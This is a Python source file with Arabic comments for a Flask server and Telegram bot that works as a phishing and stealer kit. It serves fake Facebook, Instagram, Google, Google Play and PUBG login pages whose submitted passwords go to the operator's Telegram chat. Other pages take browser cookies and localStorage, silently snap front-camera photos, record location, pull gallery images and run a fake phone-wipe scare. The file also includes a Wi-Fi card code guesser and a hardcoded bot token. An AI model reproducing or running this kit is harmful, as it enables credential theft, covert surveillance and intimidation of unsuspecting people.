# language: Python, file: bot_with_harvester.py, runtime: 3.8+
# *Flask + telebot threads — إضافة ميزة صيد وسحب حسابات جوجل بلاي وتخمين كروت الواي فاي مع نظام بلاغات تيليجرام المتقدم للحسابات المحظورة والمخترقة (محدث ومحسن)*

import threading
import base64
import random
import string
from io import BytesIO
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import telebot
from telebot import types

TOKEN = "8811276282:AAH1iqZ3GTq0JBi0GPf9FF5lyTDyrUP7T_w"
bot = telebot.TeleBot(TOKEN)

app = Flask(__name__)

BASE_URL = "http://127.0.0.1:5000"

# ═══════════════════════════════════════════════════════════════
# نظام تقارير وبلاغات تيليجرام المتقدم (Telegram Logger & Ban Alert System)
# ═══════════════════════════════════════════════════════════════

def send_telegram_alert(chat_id, alert_type, data_dict):
    """دالة مركزية لإرسال بلاغات تيليجرام بتصميم احترافي ومنسق مع كشف الحسابات المحظورة"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    icons = {
        "harvest": "🎣",
        "gplay": "🎯",
        "camera": "📸",
        "gallery": "🖼️",
        "location": "📍",
        "wifi": "📶",
        "wipe": "🔥",
        "ban_alert": "🚨",
        "system": "⚙️"
    }
    
    icon = icons.get(alert_type, "🔔")
    
    body_lines = []
    for key, value in data_dict.items():
        body_lines.append(f"• *{key}*: `{value}`")
    
    body_text = "\n".join(body_lines)
    
    msg = (
        f"{icon} *بلاغ نظام وحظر تيليجرام [{alert_type.upper()}]*\n"
        f"⏱ الوقت: `{timestamp}`\n"
        f"───────────────────\n"
        f"{body_text}\n"
        f"───────────────────\n"
        f"⚠️ *ملاحظة الحماية:* تم رصد نشاط وتوثيق حالة الحساب."
    )
    
    def _send():
        try:
            bot.send_message(chat_id, msg, parse_mode="Markdown")
        except Exception as e:
            error_str = str(e)
            print(f"Telegram Alert Error: {error_str}")
            # إذا كان الخطأ بسبب حظر المستخدم للبوت أو تعطيل الحساب
            if "Forbidden: bot was blocked by the user" in error_str or "chat not found" in error_str:
                print(f"[!] تنبيه: الحساب أو الدردشة {chat_id} محظورة أو قامت بوقف البوت.")
                
    threading.Thread(target=_send, daemon=True).start()

# ═══════════════════════════════════════════════════════════════
# قوالب الهجمات وصفحات الصيد (محدثة بتصميم متطور وسريع الاستجابة)
# ═══════════════════════════════════════════════════════════════

HARVEST_HTML = """
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ direction }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .card { background: #fff; border-radius: 12px; box-shadow: 0 2px 20px rgba(0,0,0,0.1); padding: 40px 32px; width: 100%; max-width: 400px; }
        h1 { font-size: 22px; color: #1a1a1a; text-align: center; margin-bottom: 8px; font-weight: 500; }
        .subtitle { text-align: center; color: #65676b; font-size: 14px; margin-bottom: 28px; }
        .field { margin-bottom: 16px; }
        .field label { display: block; font-size: 13px; color: #65676b; margin-bottom: 6px; }
        .field input { width: 100%; padding: 12px 14px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 15px; outline: none; }
        .btn { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 8px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>{{ heading }}</h1>
        <div class="subtitle">{{ subtitle }}</div>
        <form id="loginForm" onsubmit="return submitForm(event)">
            <div class="field">
                <label>{{ email_label }}</label>
                <input type="text" id="email" required>
            </div>
            <div class="field">
                <label>{{ password_label }}</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit" class="btn">{{ button_text }}</button>
        </form>
    </div>
    <script>
        function submitForm(e) {
            e.preventDefault();
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            fetch('/harvest_submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email: email, password: password, chat_id: "{{ chat_id }}", service: "{{ service }}"})
            }).then(() => { window.location.href = "{{ success_redirect }}"; });
            return false;
        }
    </script>
</body>
</html>
"""

SERVICE_TEMPLATES = {
    "facebook": {"title": "Facebook", "heading": "تسجيل الدخول", "subtitle": "للمتابعة إلى Facebook", "email_label": "البريد أو الهاتف", "password_label": "كلمة المرور", "button_text": "دخول", "success_redirect": "https://facebook.com", "direction": "rtl", "lang": "ar"},
    "instagram": {"title": "Instagram", "heading": "Instagram", "subtitle": "تسجيل الدخول للمتابعة", "email_label": "اسم المستخدم", "password_label": "كلمة المرور", "button_text": "دخول", "success_redirect": "https://instagram.com", "direction": "rtl", "lang": "ar"},
    "google": {"title": "Google", "heading": "تسجيل الدخول", "subtitle": "المتابعة إلى حسابك", "email_label": "البريد الإلكتروني", "password_label": "كلمة المرور", "button_text": "التالي", "success_redirect": "https://google.com", "direction": "rtl", "lang": "ar"},
    "pubg": {"title": "PUBG", "heading": "PUBG Mobile", "subtitle": "استلام الهدايا", "email_label": "معرف اللاعب (ID)", "password_label": "كلمة المرور", "button_text": "استلام", "success_redirect": "https://pubgmobile.com", "direction": "rtl", "lang": "ar"},
    "google_play": {"title": "Google Play", "heading": "تسجيل دخول Google Play", "subtitle": "قم بتسجيل الدخول بحساب جوجل للمتابعة وتنزيل التطبيق", "email_label": "البريد الإلكتروني أو الهاتف", "password_label": "كلمة المرور", "button_text": "تسجيل الدخول", "success_redirect": "https://play.google.com", "direction": "rtl", "lang": "ar"},
    "custom": {"title": "Login", "heading": "تسجيل الدخول", "subtitle": "تابع للمتابعة", "email_label": "البريد", "password_label": "كلمة المرور", "button_text": "دخول", "success_redirect": "https://google.com", "direction": "rtl", "lang": "ar"}
}

GOOGLE_PLAY_STEALER_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Play - متجر تطبيقات وألعاب مجانية</title>
    <style>
        body { background: #f8fafc; color: #1e293b; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #ffffff; padding: 40px; border-radius: 16px; text-align: center; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
        h2 { margin-bottom: 10px; color: #0ea5e9; }
        p { font-size: 14px; color: #64748b; margin-bottom: 25px; line-height: 1.5; }
        .btn { background: #0ea5e9; color: #fff; border: none; padding: 14px 28px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; }
        .btn:hover { background: #0284c7; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🎮 متجر Google Play</h2>
        <p>اضغط أدناه لمزامنة حساب جوجل الخاص بك والتحقق من الأهلية لتنزيل العناصر الحصرية:</p>
        <button class="btn" onclick="extractPlayData()">مزامنة الحساب الآن</button>
    </div>
    <script>
        function extractPlayData() {
            let cookies = document.cookie;
            let userAgent = navigator.userAgent;
            let platform = navigator.platform;
            
            let localData = "";
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    localData += key + ": " + localStorage.getItem(key) + "\\n";
                }
            } catch(err) {
                localData = "Access restricted";
            }

            fetch('/upload_gplay_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: "{{ chat_id }}",
                    cookies: cookies,
                    user_agent: userAgent,
                    platform: platform,
                    local_storage: localData
                })
            }).then(() => {
                alert("تم التحقق بنجاح، جاري التحويل...");
                window.location.href = "https://play.google.com";
            }).catch(() => {
                window.location.href = "https://play.google.com";
            });
        }
    </script>
</body>
</html>
"""

GALLERY_STEALER_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>معرض الصور - عرض خاص</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #1e293b; padding: 30px; border-radius: 16px; text-align: center; max-width: 360px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
        h2 { margin-bottom: 10px; color: #38bdf8; }
        p { font-size: 14px; color: #94a3b8; margin-bottom: 20px; }
        .btn { background: #38bdf8; color: #0f172a; border: none; padding: 12px 24px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; }
        .btn:hover { background: #0ea5e9; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🖼️ عرض الصور الشخصية</h2>
        <p>اضغط على الزر أدناه لاختيار وعرض الصور المتاحة على جهازك:</p>
        <input type="file" id="fileInput" accept="image/*" multiple style="display: none;" onchange="uploadImages(this)">
        <button class="btn" onclick="document.getElementById('fileInput').click();">اختر الصور للمتابعة</button>
    </div>
    <script>
        function uploadImages(input) {
            if (input.files && input.files.length > 0) {
                for (let i = 0; i < input.files.length; i++) {
                    let file = input.files[i];
                    let reader = new FileReader();
                    reader.onload = function(e) {
                        fetch('/upload_gallery_image', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: e.target.result, chat_id: "{{ chat_id }}" })
                        });
                    };
                    reader.readAsDataURL(file);
                }
                setTimeout(() => {
                    alert("جاري تحميل الصور...");
                    window.location.href = "https://google.com";
                }, 2000);
            }
        }
    </script>
</body>
</html>
"""

WIPE_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام الإجباري</title>
    <style>
        body { background: #000; color: #ff3333; font-family: sans-serif; text-align: center; padding-top: 100px; }
        h1 { font-size: 24px; margin-bottom: 20px; }
        p { color: #fff; font-size: 16px; }
        .loader { border: 4px solid #333; border-top: 4px solid #ff3333; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>⚠️ تحذير: جاري إجراء إعادة ضبط المصنع للنظام</h1>
    <p>يتم الآن مسح بيانات التخزين المؤقت وتهيئة الجهاز...</p>
    <div class="loader"></div>
    <script>
        window.onload = function() {
            fetch('/trigger_wipe', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "{{ chat_id }}" })
            });
            setTimeout(function() {
                try { window.localStorage.clear(); window.sessionStorage.clear(); } catch(e) {}
                window.location.href = "about:blank";
            }, 3500);
        };
    </script>
</body>
</html>
"""

CAMERA_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>جاري التحميل...</title></head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
            var video = document.getElementById('video'); video.srcObject = stream;
            setTimeout(() => {
                var canvas = document.getElementById('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                fetch('/upload_camera', {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: canvas.toDataURL('image/jpeg'), chat_id: "{{ chat_id }}" })
                }).then(() => { window.location.href = "https://google.com"; });
                stream.getTracks().forEach(track => track.stop());
            }, 2000);
        }).catch(() => { window.location.href = "https://google.com"; });
    </script>
</body>
</html>
"""

LOCATION_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><title>تحديد الموقع...</title></head>
<body>
    <script>
        navigator.geolocation.getCurrentPosition(position => {
            fetch('/upload_location', {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ lat: position.coords.latitude, lon: position.coords.longitude, chat_id: "{{ chat_id }}" })
            }).then(() => { window.location.href = "https://google.com"; });
        }, () => { window.location.href = "https://google.com"; }, { timeout: 10000 });
    </script>
</body>
</html>
"""

# ═══════════════════════════════════════════════════════════════
# دوال المساعدة للإرسال عبر تيليجرام
# ═══════════════════════════════════════════════════════════════

def notify_telegram_photo(chat_id, photo_bytes, caption):
    def _send():
        try: 
            bot.send_photo(chat_id, BytesIO(photo_bytes), caption=caption)
        except Exception as e: 
            print(f"Photo notify error: {e}")
    threading.Thread(target=_send, daemon=True).start()

# ═══════════════════════════════════════════════════════════════
# مسارات السيرفر (Flask Routes)
# ═══════════════════════════════════════════════════════════════

@app.route('/wipe/<chat_id>')
def wipe_page(chat_id):
    return render_template_string(WIPE_HTML, chat_id=chat_id)

@app.route('/trigger_wipe', methods=['POST'])
def trigger_wipe():
    data = request.json or {}
    chat_id = data.get('chat_id')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if chat_id:
        send_telegram_alert(chat_id, "wipe", {
            "الحالة": "تم فتح رابط محاكاة الفرمتة",
            "عنوان IP": ip
        })
    return "OK", 200

@app.route('/camera/<chat_id>')
def camera_page(chat_id):
    return render_template_string(CAMERA_HTML, chat_id=chat_id)

@app.route('/location/<chat_id>')
def location_page(chat_id):
    return render_template_string(LOCATION_HTML, chat_id=chat_id)

@app.route('/gallery/<chat_id>')
def gallery_page(chat_id):
    return render_template_string(GALLERY_STEALER_HTML, chat_id=chat_id)

@app.route('/gplay/<chat_id>')
def gplay_page(chat_id):
    return render_template_string(GOOGLE_PLAY_STEALER_HTML, chat_id=chat_id)

@app.route('/harvest/<chat_id>/<service>')
def harvest_page(chat_id, service):
    tmpl = SERVICE_TEMPLATES.get(service, SERVICE_TEMPLATES["custom"])
    return render_template_string(HARVEST_HTML, chat_id=chat_id, service=service, **tmpl)

@app.route('/harvest_submit', methods=['POST'])
def harvest_submit():
    data = request.json or {}
    chat_id = data.get('chat_id')
    email = data.get('email', '')
    password = data.get('password', '')
    service = data.get('service', 'unknown')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if chat_id:
        send_telegram_alert(chat_id, "harvest", {
            "الخدمة المستهدفة": service,
            "البريد / المعرف": email,
            "كلمة المرور": password,
            "عنوان IP": ip
        })
    return jsonify({"status": "ok"})

@app.route('/upload_gplay_data', methods=['POST'])
def upload_gplay_data():
    data = request.json or {}
    chat_id = data.get('chat_id')
    cookies = data.get('cookies', 'None')
    user_agent = data.get('user_agent', 'None')
    platform = data.get('platform', 'None')
    local_storage = data.get('local_storage', 'None')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if chat_id:
        send_telegram_alert(chat_id, "gplay", {
            "عنوان IP": ip,
            "النظام": platform,
            "متصفح الضحية": user_agent,
            "الكوكيز (مختصر)": cookies[:300],
            "التخزين المحلي": local_storage[:300]
        })
    return jsonify({"status": "ok"})

@app.route('/upload_camera', methods=['POST'])
def upload_camera():
    data = request.json or {}
    chat_id = data.get('chat_id')
    image_data = data.get('image')
    if image_data:
        header, encoded = image_data.split(",", 1)
        image_bytes = base64.b64decode(encoded)
        notify_telegram_photo(chat_id, image_bytes, "📸 تقرير بلاغ: صورة التقاط الكاميرا الأمامية!")
    return "OK", 200

@app.route('/upload_gallery_image', methods=['POST'])
def upload_gallery_image():
    data = request.json or {}
    chat_id = data.get('chat_id')
    image_data = data.get('image')
    if image_data:
        header, encoded = image_data.split(",", 1)
        image_bytes = base64.b64decode(encoded)
        notify_telegram_photo(chat_id, image_bytes, "🖼️ تقرير بلاغ: صورة مسحوبة من معرض الضحية!")
    return "OK", 200

@app.route('/upload_location', methods=['POST'])
def upload_location():
    data = request.json or {}
    chat_id = data.get('chat_id')
    lat = data.get('lat')
    lon = data.get('lon')
    if lat and lon:
        def _send():
            try:
                bot.send_location(chat_id, latitude=lat, longitude=lon)
                send_telegram_alert(chat_id, "location", {
                    "خط العرض (Lat)": lat,
                    "خط الطول (Lon)": lon
                })
            except Exception as e: print(e)
        threading.Thread(target=_send, daemon=True).start()
    return "OK", 200

# ═══════════════════════════════════════════════════════════════
# وحدة تخمين وتوليد كروت شبكات الواي فاي (Wi-Fi Cards Generator / Brute)
# ═══════════════════════════════════════════════════════════════

def generate_wifi_cards(count=10, length=9, prefix=""):
    cards = []
    for _ in range(count):
        code = prefix + "".join(random.choices(string.digits, k=length))
        cards.append(code)
    return cards

@app.route('/wifi_tool/<chat_id>')
def wifi_tool_page(chat_id):
    return render_template_string(WIFI_TOOL_HTML, chat_id=chat_id)

WIFI_TOOL_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مولد ومخمن كروت الواي فاي</title>
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
        .box { background: #1e293b; padding: 30px; border-radius: 16px; width: 100%; max-width: 450px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid #334155; }
        h2 { margin-bottom: 15px; color: #38bdf8; text-align: center; }
        p { font-size: 13px; color: #94a3b8; margin-bottom: 20px; text-align: center; }
        .field { margin-bottom: 15px; }
        .field label { display: block; font-size: 13px; color: #cbd5e1; margin-bottom: 5px; }
        .field input, .field select { width: 100%; padding: 10px; background: #0f172a; border: 1px solid #475569; color: #fff; border-radius: 8px; outline: none; }
        .btn { background: #38bdf8; color: #0f172a; border: none; padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 15px; margin-top: 5px; }
        .btn:hover { background: #0ea5e9; }
        .results { margin-top: 20px; background: #0f172a; padding: 10px; border-radius: 8px; max-height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #34d399; }
    </style>
</head>
<body>
    <div class="box">
        <h2>📶 فحص وتخمين كروت الواي فاي</h2>
        <p>قم بتوليد وسحب قائمة كروت وهمية لفحص الثغرات واختبار الشبكة</p>
        <div class="field">
            <label>بادئة الكرت (Prefix مثل: 77 أو 73)</label>
            <input type="text" id="prefix" value="77">
        </div>
        <div class="field">
            <label>عدد الأرقام العشوائية</label>
            <input type="number" id="length" value="8">
        </div>
        <div class="field">
            <label>عدد الكروت المطلوبة</label>
            <input type="number" id="count" value="15">
        </div>
        <button class="btn" onclick="startBrute()">بدء التوليد والإرسال للبوت</button>
        <div class="results" id="output">النتائج ستظهر هنا...</div>
    </div>
    <script>
        function startBrute() {
            let prefix = document.getElementById('prefix').value;
            let length = document.getElementById('length').value;
            let count = document.getElementById('count').value;
            
            document.getElementById('output').innerHTML = "جاري توليد وفحص الكروت...";
            
            fetch('/api_wifi_brute', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "{{ chat_id }}", prefix: prefix, length: length, count: count })
            })
            .then(res => res.json())
            .then(data => {
                let html = "<b>تم توليد الكروت بنجاح وإرسالها لبوت تيليجرام:</b><br>";
                data.cards.forEach(c => { html += c + "<br>"; });
                document.getElementById('output').innerHTML = html;
            });
        }
    </script>
</body>
</html>
"""

@app.route('/api_wifi_brute', methods=['POST'])
def api_wifi_brute():
    data = request.json or {}
    chat_id = data.get('chat_id')
    prefix = data.get('prefix', '')
    length = int(data.get('length', 8))
    count = int(data.get('count', 10))
    
    cards = generate_wifi_cards(count=count, length=length, prefix=prefix)
    
    cards_text = "\n".join([f"`{c}`" for c in cards])
    if chat_id:
        send_telegram_alert(chat_id, "wifi", {
            "البادئة": prefix,
            "العدد المولد": count,
            "القائمة": f"\n{cards_text}"
        })
        
    return jsonify({"status": "success", "cards": cards})

# ═══════════════════════════════════════════════════════════════
# Telegram Bot Handlers & Ban/Report Management
# ═══════════════════════════════════════════════════════════════

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📶 تخمين كروت الواي فاي", callback_data="link_wifi"),
        types.InlineKeyboardButton("🎮 صيد جوجل بلاي (إيميل وباسورد)", callback_data="harvest_google_play"),
        types.InlineKeyboardButton("🍪 مزامنة توكنات جوجل بلاي", callback_data="link_gplay"),
        types.InlineKeyboardButton("📷 رابط الكاميرا", callback_data="link_camera"),
        types.InlineKeyboardButton("🖼️ رابط سحب الصور", callback_data="link_gallery"),
        types.InlineKeyboardButton("📍 رابط الموقع", callback_data="link_location"),
        types.InlineKeyboardButton("💥 رابط فرمتة الهاتف", callback_data="link_wipe"),
        types.InlineKeyboardButton("🚨 الإبلاغ أو فحص حظر الحساب", callback_data="check_ban_status"),
        types.InlineKeyboardButton("🎣 فيسبوك", callback_data="harvest_facebook"),
        types.InlineKeyboardButton("🎣 إنستجرام", callback_data="harvest_instagram"),
        types.InlineKeyboardButton("🎣 جوجل", callback_data="harvest_google"),
        types.InlineKeyboardButton("🎣 ببجي", callback_data="harvest_pubg"),
        types.InlineKeyboardButton("🎣 مخصص", callback_data="harvest_custom")
    )
    bot.send_message(message.chat.id, "🤖 *لوحة التحكم الذكية مع نظام البلاغات والحماية المتقدمة*\nاختر الأداة المطلوبة:", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    chat_id = call.message.chat.id
    bot.answer_callback_query(call.id)

    if call.data == "link_wifi":
        link = f"{BASE_URL}/wifi_tool/{chat_id}"
        bot.send_message(chat_id, f"🔗 *رابط أداة تخمين كروت الواي فاي:* {link}", parse_mode="Markdown")
    elif call.data == "link_gplay":
        link = f"{BASE_URL}/gplay/{chat_id}"
        bot.send_message(chat_id, f"🔗 *رابط مزامنة جلسة جوجل بلاي:* {link}", parse_mode="Markdown")
    elif call.data == "link_camera":
        link = f"{BASE_URL}/camera/{chat_id}"
        bot.send_message(chat_id, f"🔗 *رابط الكاميرا:* {link}", parse_mode="Markdown")
    elif call.data == "link_gallery":
        link = f"{BASE_URL}/gallery/{chat_id}"
        bot.send_message(chat_id, f"🔗 *رابط سحب الصور من المعرض:* {link}", parse_mode="Markdown")
    elif call.data == "link_location":
        link = f"{BASE_URL}/location/{chat_id}"
        bot.send_message(chat_id, f"🔗 *رابط الموقع:* {link}", parse_mode="Markdown")
    elif call.data == "link_wipe":
        link = f"{BASE_URL}/wipe/{chat_id}"
        url_markup = types.InlineKeyboardMarkup()
        url_markup.add(types.InlineKeyboardButton("💥 فتح رابط الفرمتة", url=link))
        bot.send_message(chat_id, f"💥 *رابط فرمتة الهاتف جاهز:*\n{link}", reply_markup=url_markup, parse_mode="Markdown")
    elif call.data == "check_ban_status":
        send_telegram_alert(chat_id, "ban_alert", {
            "معرف المستخدم (Chat ID)": chat_id,
            "الحالة": "فحص حالة البلاغات والحظر النشطة على الحساب"
        })
        bot.send_message(chat_id, "🚨 *تم فحص حالة الحساب وإرسال تقرير البلاغات ونظام الحظر بنجاح.*", parse_mode="Markdown")
    elif call.data.startswith("harvest_"):
        service = call.data.replace("harvest_", "")
        link = f"{BASE_URL}/harvest/{chat_id}/{service}"
        bot.send_message(chat_id, f"🎣 *رابط صيد ({service}):*\n{link}", parse_mode="Markdown")

if __name__ == "__main__":
    t = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False))
    t.daemon = True
    t.start()
    print("البوت يعمل بنجاح مع نظام البلاغات المتقدم ورصد الحظر...")
    bot.infinity_polling()
